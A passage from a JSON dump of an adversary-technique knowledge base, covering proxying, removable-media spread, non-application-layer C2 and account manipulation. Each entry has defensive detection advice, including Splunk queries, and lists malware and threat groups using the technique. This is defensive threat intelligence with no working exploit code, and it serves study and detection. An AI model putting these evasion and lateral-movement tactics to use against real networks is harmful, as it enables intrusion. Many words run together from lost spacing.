      "ATYPEFRAMEvariant can force the compromised system to function as a proxy server.[65]",
      "Ursnifhas used a peer-to-peer (P2P) network for C2.[66][67]",
      "Vasportis capable of tunneling though a proxy.[68]",
      "Volt Typhoonhas used compromised devices and customized versions of open source tools  such asFRP(Fast Reverse Proxy), Earthworm, andImpacketto proxy network traffic.[69][70][71]",
      "WarzoneRAThas the capability to act as a reverse proxy.[72]",
      "Windigohas delivered a generic Windows proxy Win32/Glubteta.M.Windigohas also used multiple reverse proxy chains as part of their C2 infrastructure.[73]",
      "XTunnelrelays traffic between a C2 server and a victim.[74]",
      "ZIPLINEcan create a proxy server on compromised hosts.[75][76]",
      "ZxShellcan set up an HTTP or SOCKS proxy.[2][77]"
    ]
  },
  "T1090.001": {
    "Name": "Proxy:Internal Proxy",
    "Description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, includingHTRAN, ZXProxy, and ZXPortMap.[1]Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "DuringAPT28 Nearest Neighbor Campaign,APT28used the built-innetsh portproxycommand to create internal proxies on compromised systems.[2]",
      "APT39used custom tools to create SOCK5 and custom protocol proxies between infected hosts.[3][4]",
      "The \"ZJ\" variant ofBACKSPACEallows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.[5]",
      "CHOPSTICKused a proxy server between victims and the C2 server.[6]",
      "Cobalt Strikecan be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.[7][8]",
      "Drovorubcan use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.[9]",
      "Duqucan be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.[10]",
      "FatDukecan used pipes to connect machines with restricted internet access to remote machines via other infected hosts.[11]",
      "FIN13has utilized a proxy tool to communicate between compromised assets.[12]",
      "Gomircan start a reverse proxy to initiate connections to arbitrary endpoints in victim networks.[13]",
      "Higaisadiscovered system proxy settings and used them if available.[14]",
      "Hikitsupports peer connections.[15]",
      "InvisiMolecan function as a proxy to create a server that relays communication between the client and C&C server, or between two clients.[16]",
      "Kazuarhas used internal nodes on the compromised network for C2 communications.[17]",
      "Lazarus Grouphas used a compromised router to serve as a proxy between a victim network's corporate and restricted segments.[18]",
      "Lotus Blossomhas used publicly available tools such as the Venom proxy tool to proxy traffic out of victim environments.[19]",
      "Mafaldacan create a named pipe to listen for and send data to a named pipe-based C2 server.[20]",
      "metaMaincan create a named pipe to listen for and send data to a named pipe-based C2 server.[20]",
      "MiniDukecan can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.[11]",
      "Mythiccan leverage a peer-to-peer C2 profile between agents.[21]",
      "Ninjacan proxy C2 communications including to and from internal agents without internet connectivity.[22][23]",
      "DuringOperation Wocao, threat actors proxied traffic through multiple infected systems.[24]",
      "Pay2Keyhas designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.[25][26]",
      "Sliverhas a built-in SOCKS5 proxying capability allowing forSliverclients to proxy network traffic through other clients within a victim network.[27]",
      "During theSolarWinds Compromise,APT29used SSH port forwarding capabilities on public-facing systems, and configured at least one instance ofCobalt Striketo use a network pipe over SMB.[28][29]",
      "Striderhas used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.[30]",
      "Stuxnetinstalls an RPC server for P2P communications.[31]",
      "Turlahas compromised internal network systems to act as a proxy to forward traffic to C2.[32]",
      "Velvet Anthas tunneled traffic from victims through an internal, compromised host to proxy communications to command and control nodes.[33]",
      "Volt Typhoonhas used the built-innetshport proxycommand to create proxies on compromised systems to facilitate access.[34][35]",
      "TheWinnti for WindowsHTTP/S C2 mode can make use of a local proxy.[36]"
    ]
  },
  "T1090.002": {
    "Name": "Proxy:External Proxy",
    "Description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, includingHTRAN, ZXProxy, and ZXPortMap.[1]Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT28used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.APT28has also used a machine to relay and obscure communications betweenCHOPSTICKand their server.[2][3][4]",
      "APT29uses compromised residential endpoints as proxies for defense evasion and network access.[5]",
      "AnAPT3downloader establishes SOCKS5 connections for its initial C2.[6]",
      "APT39has used various tools to proxy C2 communications.[7]",
      "FIN5maintains access to victim environments by usingFLIPSIDEto create a proxy for a backup RDP tunnel.[8]",
      "GALLIUMused a modified version ofHTRANto redirect connections between networks.[9]",
      "InvisiMoleInvisiMole can identify proxy servers used by the victim and use them for C2 communication.[10][11]",
      "Lazarus Grouphas used multiple proxies to obfuscate network traffic from victims.[12][13]",
      "menuPasshas used a global service provider's IP as a proxy for C2 traffic from a victim.[14][15]",
      "MuddyWaterhas controlledPOWERSTATSfrom behind a proxy network to obfuscate the C2 location.[16]MuddyWaterhas used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).[17][18]",
      "Mythiccan leverage a modified SOCKS5 proxy to tunnel egress C2 traffic.[19]",
      "Okrumcan identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server.[20]",
      "POWERSTATShas connected to C2 servers through proxies.[21]",
      "QakBothas a module that can proxy C2 communications.[22]",
      "QUIETEXITcan proxy traffic via SOCKS.[23]",
      "Reginleveraged several compromised universities as proxies to obscure its origin.[24]",
      "ShimRatcan use pre-configured HTTP proxies.[25]",
      "Silencehas used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.[26]",
      "Tonto Teamhas routed their traffic through an external server in order to obfuscate their location.[27]",
      "TrickBothas been known to reach a command and control server via one of nine proxy IP addresses.[28][29]",
      "TheWinnti for WindowsHTTP/S C2 mode can make use of an external proxy.[30]"
    ]
  },
  "T1090.003": {
    "Name": "Proxy:Multi-hop Proxy",
    "Description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.For example, adversaries may construct or use onion routing networks – such as the publicly availableTornetwork – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.[1]Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.[2]In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e.,Network Devices). By leveragingPatch System Imageon routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon theNetwork Boundary Bridgingmethod allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.[3]",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT28has routed traffic overTorand VPN servers to obfuscate their activities.[4]",
      "A backdoor used byAPT29created aTorhidden service to forward traffic from theTorclient to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR.[5][6]",
      "Attorhas usedTorfor C2 communication.[7]",
      "BOLDMOVEis capable of relaying traffic from command and control servers to follow-on systems.[8]",
      "DuringCostaRicto, the threat actors used a layer of proxies to manage C2 communications.[9]",
      "Cyclops Blinkhas usedTornodes for C2 traffic.[10]",
      "Dokdownloads and installsTorvia homebrew.[11]",
      "Dridexcan use multiple layers of proxy servers to hide terminal nodes in its infrastructure.[12]",
      "Ember Bearhas configured multi-hop proxies via ProxyChains within victim environments.[13]",
      "FIN4has usedTorto log in to victims' email accounts.[14]",
      "FLORAHOX Activityhas routed traffic through a customizedTorrelay network layer.[2]",
      "TheFRPclient can be configured to connect to the server through a proxy.[15]",
      "GreyEnergyhas usedTorrelays for Command and Control servers.[16]",
      "Inceptionused chains of compromised routers to proxy C2 communications between them and cloud service providers.[17]",
      "IndustroyerusedTornodes for C2.[18]",
      "Keydnapuses a copy of tor2web proxy for HTTPS communications.[19]",
      "Kobaloscan chain together multiple compromised machines as proxies to reach their final targets.[20][21]",
      "Leviathanhas used multi-hop proxies to disguise the source of their malicious traffic.[22]",
      "Lotus Blossomhas used tools such as the publicly available HTran tool for proxying traffic in victim environments.[23]",
      "MacSpyusesTorfor command and control.[11]",
      "NGLitehas abused NKN infrastructure for its C2 communication.[3]",
      "Ninjahas the ability to use a proxy chain with up to 255 hops when using TCP.[24]",
      "NKAbusehas abused the NKN public blockchain protocol for its C2 communications.[25][26]",
      "DuringOperation Wocao, threat actors executed commands through the installed web shell viaTorexit nodes.[27]",
      "SiloscapeusesTorto communicate with C2.[28]",
      "SPACEHOP Activityhas routed traffic through chains of compromised network devices to proxy C2 communications.[2]",
      "StrongPitycan use multiple layers of proxy servers to hide terminal nodes in its infrastructure.[29]",
      "Traffic traversing theTornetwork will be forwarded to multiple nodes before exiting theTornetwork and continuing on to its intended destination.[30]",
      "Uroburoscan use implants on multiple compromised machines to proxy communications through its worldwide P2P network.[31]",
      "Ursnifhas usedTorfor C2.[32][33]",
      "Volt Typhoonhas used multi-hop proxies for command-and-control infrastructure.[34]",
      "WannaCryusesTorfor command and control traffic.[35]",
      "ZIRCONIUMhas utilized an ORB (operational relay box) network – consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) – to proxy traffic.[2]"
    ]
  },
  "T1090.004": {
    "Name": "Proxy:Domain Fronting",
    "Description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.[1]Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s))."
    ],
    "Procedure Examples": [
      "APT29has used the meek domain fronting plugin forTorto hide the destination of C2 traffic.[2]",
      "Cobalt Strikehas the ability to accept a value for HTTP Host Header to enable domain fronting.[3]",
      "meekuses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination.",
      "Mythicsupports domain fronting via custom request headers.[4]",
      "SMOKEDHAMhas used a fronted domain to obfuscate its hard-coded C2 server domain.[5]"
    ]
  },
  "T1091": {
    "Name": "Replication Through Removable Media",
    "Description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.[1]This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[2][3]For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
    "Detects": [
      "Monitor for newly constructed drive letters or mount points to removable mediaAnalytic 1 - Removable Media Mount Eventsindex=windows sourcetype=\"WinEventLog:Microsoft-Windows-Partition/Operational\" EventID=1006| stats count by DeviceName, VolumeName, EventID, ComputerName, _time| where count > 1| table _time, DeviceName, VolumeName, ComputerName",
      "Monitor for unexpected files accessed on removable media.Analytic 1 - File read events from removable mediaindex=windows sourcetype=\"WinEventLog:Security\" EventID=4663Accesses=\"ReadData (or ListDirectory)\" AND ObjectType=\"File\"| stats count by ObjectName, Account_Name, ProcessName, ComputerName, _time| where match(ObjectName, \".:\\\\RemovableMedia\\\\.\") OR match(ObjectName, \".:\\\\USB.\")| table _time, ObjectName, Account_Name, ProcessName, ComputerName",
      "Monitor for newly constructed files on removable mediaAnalytic 1 - File creation events on removable mediaindex=windows sourcetype=\"WinEventLog:Security\" EventID=4663Accesses=\"WriteData (or AddFile)\" AND ObjectType=\"File\"| stats count by ObjectName, Account_Name, ProcessName, ComputerName, _time| where match(ObjectName, \".:\\\\RemovableMedia\\\\.\") OR match(ObjectName, \".:\\\\USB.\")| table _time, ObjectName, Account_Name, ProcessName, ComputerName",
      "Monitor for newly executed processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.Analytic 1 - Processes Executing from Removable Mediaindex=windows sourcetype=\"WinEventLog:Security\" EventID=4688| stats count by New_Process_Name, Creator_Process_Name, Account_Name, ComputerName, _time| where match(New_Process_Name, \".:\\\\RemovableMedia\\\\.\") OR match(New_Process_Name, \".:\\\\USB.\")| table _time, New_Process_Name, Creator_Process_Name, Account_Name, ComputerName"
    ],
    "Procedure Examples": [
      "Agent.btzdrops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.[4]",
      "ANDROMEDAhas been spread via infected USB keys.[5]",
      "Aoqin Dragonhas used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.[6]",
      "APT28uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[7]",
      "Part ofAPT28's operation involved usingCHOPSTICKmodules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.[8][7][9]",
      "Confickervariants used the Windows AUTORUN feature to spread through USB propagation.[10][11]",
      "Crimsoncan spread across systems by infecting removable media.[12]",
      "Darkhotel's selective infector modifies executables stored on removable media as a method of spreading across computers.[13]",
      "DustySkysearches for removable media and duplicates itself onto it.[14]",
      "FIN7actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.[15]",
      "Flamecontains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.[16]",
      "H1N1has functionality to copy itself to removable media.[17]",
      "LuminousMothhas used malicious DLLs to spread malware to connected removable USB drives on infected machines.[18][19]",
      "Mustang Pandahas used a customizedPlugXvariant which could spread through USB connections.[20]",
      "njRATcan be configured to spread via removable drives.[21][22]",
      "QakBothas the ability to use removable drives to spread through compromised networks.[23]",
      "Ramsaycan spread itself by infecting other portable executable files on removable drives.[24]",
      "Raspberry Robinhas historically used infected USB media to spread to new victims.[25][26]",
      "APT30may have used theSHIPSHAPEmalware to move onto air-gapped networks.SHIPSHAPEtargets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.[27]",
      "Stuxnetcan propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.[28]",
      "Tropic Trooperhas attempted to transferUSBferryfrom an infected USB device by copying an Autorun function to the target machine.[29]",
      "Unknown Loggeris capable of spreading to USB devices.[30]",
      "Ursnifhas copied itself to and infected removable drives for propagation.[31][32]",
      "USBferrycan copy its installer to attached USB storage devices.[29]",
      "USBStealerdrops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.[33]"
    ]
  },
  "T1092": {
    "Name": "Communication Through Removable Media",
    "Description": "Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.[1]Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement byReplication Through Removable Media. Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",
    "Detects": [
      "Monitor for unexpected file access on removable media",
      "Monitor for newly executed processes when removable media is mounted."
    ],
    "Procedure Examples": [
      "APT28uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[2]",
      "Part ofAPT28's operation involved usingCHOPSTICKmodules to copy itself to air-gapped machines, using files written to USB sticks to transfer data and command traffic.[3][4][2]",
      "USBStealerdrops commands for a second victim onto a removable media drive inserted into the first victim, and commands are executed when the drive is inserted into the second victim.[1]"
    ]
  },
  "T1095": {
    "Name": "Non-Application Layer Protocol",
    "Description": "Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.[1]Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example.[2]Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.[3]However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.[4]",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).While VMCI traffic is invisible to most traditional network sniffing tools, there are ways to potentially monitor this traffic.[102]",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.While VMCI traffic is invisible to most traditional network sniffing tools, there are ways to potentially monitor this traffic.[102]"
    ],
    "Procedure Examples": [
      "During the2022 Ukraine Electric Power Attack,Sandworm Teamproxied C2 communications within a TLS-based tunnel.[5]",
      "Anchorhas used ICMP in C2 communications.[6]",
      "AnAPT3downloader establishes SOCKS5 connections for its initial C2.[7]",
      "Aria-bodyhas used TCP in C2 communications.[8]",
      "AuTo Stealercan use TCP to communicate with command and control servers.[9]",
      "BackdoorDiplomacyhas used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.[10]",
      "Bandookhas a command built in to use a raw TCP socket.[11]",
      "Bisonalhas used raw sockets for network communication.[12]",
      "BITTERhas used TCP for C2 communications.[13]",
      "Brute Ratel C4has the ability to use TCP for external C2.[14]",
      "BUBBLEWRAPcan communicate using SOCKS.[15]",
      "DuringC0021, the threat actors used TCP for some C2 communications.[16]",
      "Carbonuses TCP and UDP for C2.[17]",
      "cd00rcan monitor incoming C2 communications sent over TCP to the compromised host.[18][19]",
      "Clamblinghas the ability to use TCP and UDP for communication.[20]",
      "COATHANGERuses ICMP for transmitting configuration information to and from its command and control server.[21]",
      "Cobalt Strikecan be configured to use TCP, ICMP, and UDP for C2 communications.[22][23]",
      "Crimsonuses a custom TCP protocol for C2.[24][25]",
      "Cryptoisticcan use TCP in communications with C2.[26]",
      "Cuckoo Stealercan use sockets for communications to its C2 server.[27]",
      "DuringCutting Edge, threat actors used the Unix socket and a reverse TCP shell for C2 communications.[28]",
      "Derusbibinds to a raw socket on a random source port between 31800 and 31900 for C2.[29]",
      "Drovorubcan use TCP to communicate between its agent and client modules.[30]",
      "Ember Bearuses socket-based tunneling utilities for command and control purposes such as NetCat and Go Simple Tunnel (GOST). These tunnels are used to push interactive command prompts over the created sockets.[31]Ember Bearhas also used reverse TCP connections from Meterpreter installations to communicate back with C2 infrastructure.[32]",
      "Some variants ofFakeMuse SSL to communicate with C2 servers.[33]",
      "FIN6has used Metasploit Bind and Reverse TCP stagers.[34]",
      "FRPcan communicate over TCP, TCP stream multiplexing, KERN Communications Protocol (KCP), QUIC, and UDP.[35]",
      "FunnyDreamcan communicate with C2 over TCP and UDP.[36]",
      "Gelsemiumhas the ability to use TCP and UDP in C2 communications.[37]",
      "gh0st RAThas used an encrypted protocol within TCP segments to communicate with the C2.[38]",
      "HAFNIUMhas used TCP for C2.[39]",
      "HiddenWaspcommunicates with a simple network protocol over TCP.[40]",
      "InvisiMolehas used TCP to download additional modules.[41]",
      "J-magiccan monitor incoming C2 communications sent over TCP to the compromised host.[19]",
      "KEYPLUGcan use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication.[42]",
      "KV Botnet Activitycommand and control traffic uses a non-standard, likely custom protocol for communication.[43]",
      "LITTLELAMB.WOOLTEAcan function as a stand-alone backdoor communicating over the/tmp/clientsDownload.socksocket.[28]",
      "LookBackuses a custom binary protocol over sockets for C2 communications.[44]",
      "LunarMailcan ping a specific C2 URL with the ID of a victim machine in the subdomain.[45]",
      "MacMahas used a custom JSON-based protocol for its C&C communications.[46]",
      "Mafaldacan use raw TCP for C2.[47]",
      "Metadorhas used TCP for C2.[47]",
      "metaMaincan establish an indirect and raw TCP socket-based connection to the C2 server.[47][48]",
      "Metamorfohas used raw TCP for C2.[49]",
      "Mis-Typenetwork traffic can communicate over a raw socket.[50]",
      "Misdatnetwork traffic communicates over a raw socket.[50]",
      "MoonWindcompletes network communication via raw sockets.[51]",
      "Mythicsupports WebSocket and TCP-based C2 profiles.[52]",
      "Nebulaecan use TCP in C2 communications.[53]",
      "Neo-reGeorgcan create multiple TCP connections for a single session.[54]",
      "IfNETEAGLEdoes not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number,NETEAGLEwill initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.[55]",
      "NETWIREcan use TCP in C2 communications.[56][57]",
      "Ninjacan forward TCP packets between the C2 and a remote host.[58][59]",
      "DuringOperation Wocao, threat actors used a custom protocol for command and control.[60]",
      "OSX_OCEANLOTUS.Dhas used a custom binary protocol over port 443 for C2 traffic.[61]",
      "Pay2Keyhas sent its public key to the C2 server over TCP.[62]",
      "ThePenquinC2 mechanism is based on TCP and UDP packets.[63][64]",
      "PHOREALcommunicates via ICMP for C2.[65]",
      "PingPullvariants have the ability to communicate with C2 servers using ICMP or TCP.[66]",
      "ThePipeMoncommunication module can use a custom protocol based on TLS over TCP.[67]",
      "PLATINUMhas used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.[68]",
      "PlugXcan be configured to use raw TCP or UDP for command and control.[69]",
      "QakBothas the ability use TCP to send or receive C2 packets.[70]",
      "QuasarRATcan use TCP for C2 communication.[71]",
      "QUIETEXITcan establish a TCP connection as part of its initial connection to the C2.[72]",
      "RainyDaycan use TCP in C2 communications.[53]",
      "RARSTONEuses SSL to encrypt its communication with its C2 server.[73]",
      "RCSessionhas the ability to use TCP and UDP in C2 communications.[20][74]",
      "SomeReavervariants use raw TCP for C2.[75]",
      "Mustang Pandacommunicated over TCP 5000 from adversary administrative servers to adversary command and control nodes duringRedDelta Modified PlugX Infection Chain Operations.[76]",
      "reGeorgcan tunnel TCP sessions into targeted networks.[77]",
      "TheReginmalware platform can use ICMP to communicate between infected computers.[78]",
      "Remsecis capable of using ICMP, TCP, and UDP for C2.[79][80]",
      "RotaJakirouses a custom binary protocol using a type, length, value format over TCP.[81]",
      "Royalestablishes a TCP socket for C2 communication using the APIWSASocketW.[82]",
      "Samuraican use a proxy module to forward TCP packets to external hosts.[58]",
      "Sardoniccan communicate with actor-controlled C2 servers by using a custom little-endian binary protocol.[83]",
      "SDBbothas the ability to communicate with C2 with TCP over port 443.[84]",
      "ShadowPadhas used UDP for C2 communications.[85]",
      "SnappyTCPspawns a reverse TCP shell following an HTTP-based negotiation.[86]",
      "SombRAThas the ability to use TCP sockets to send data and ICMP to ping the C2 server.[87][88]",
      "Spicacan use JSON over WebSockets for C2 communications.[89]",
      "StealBitcan use the Windows Socket networking library to communicate with attacker-controlled endpoints.[90]",
      "SUGARUSHhas used TCP for C2.[91]",
      "Taidoorcan use TCP for C2 communications.[92]",
      "ToddyCathas used a passive backdoor that receives commands with UDP packets.[59]",
      "TSCookiecan use ICMP to receive information on the destination server.[93]",
      "Umbreonprovides access to the system via SSH or any other protocol that uses PAM to authenticate.[94]",
      "Uroburoscan communicate through custom methodologies for UDP,  ICMP, and TCP that use distinct sessions to ride over the legitimate protocols.[95]",
      "Versa Director Zero Day Exploitationused a non-standard TCP session to initialize communication prior to establishing HTTPS command and control.[96]",
      "WarzoneRATcan communicate with its C2 server via TCP over port 5200.[97]",
      "WellMailcan use TCP for C2 communications.[98]",
      "WINDSHIELDC2 traffic can communicate via TCP raw sockets.[65]",
      "Winnti for Linuxhas used ICMP, custom TCP, and UDP in outbound communications.[99]",
      "Winnti for Windowscan communicate using custom TCP.[100]",
      "ZIPLINEcan communicate with C2 using a custom binary protocol.[101]"
    ]
  },
  "T1098": {
    "Name": "Account Manipulation",
    "Description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.[1]These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials.In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privilegedValid Accounts.",
    "Detects": [
      "Monitor for the registration or joining of new device objects in Active Directory. Raise alerts when new devices are registered or joined without using MFA.[10]",
      "Monitor executed commands and arguments for suspicious commands to modify accounts or account settings (including files such as theauthorized_keysor/etc/ssh/sshd_config).Monitor executed commands and arguments of suspicious commands (such asAdd-MailboxPermission) that may be indicative of modifying the permissions of Exchange and other related service settings.",
      "Monitor for changes made to files related to account settings, such as/etc/ssh/sshd_configand the authorized_keys file for each user on a system.",
      "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.",
      "Monitor for newly constructed processes indicative of modifying account settings, such as those that modifyauthorized_keysor/etc/ssh/sshd_configfiles.",
      "Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670. Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ or that include additional flags such as changing a password without knowledge of the old password.Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused thesp_addlinkedsrvlogincommand in MS-SQL to create a link between a created account and other servers in the network.[2]",
      "Calistoadds permissions and remote logins to all users.[3]",
      "HAFNIUMhas granted privileges to domain accounts and reset the password for default admin accounts.[4][5]",
      "Lazarus Groupmalware WhiskeyDelta-Two contains a function that attempts to rename the administrator’s account.[6][7]",
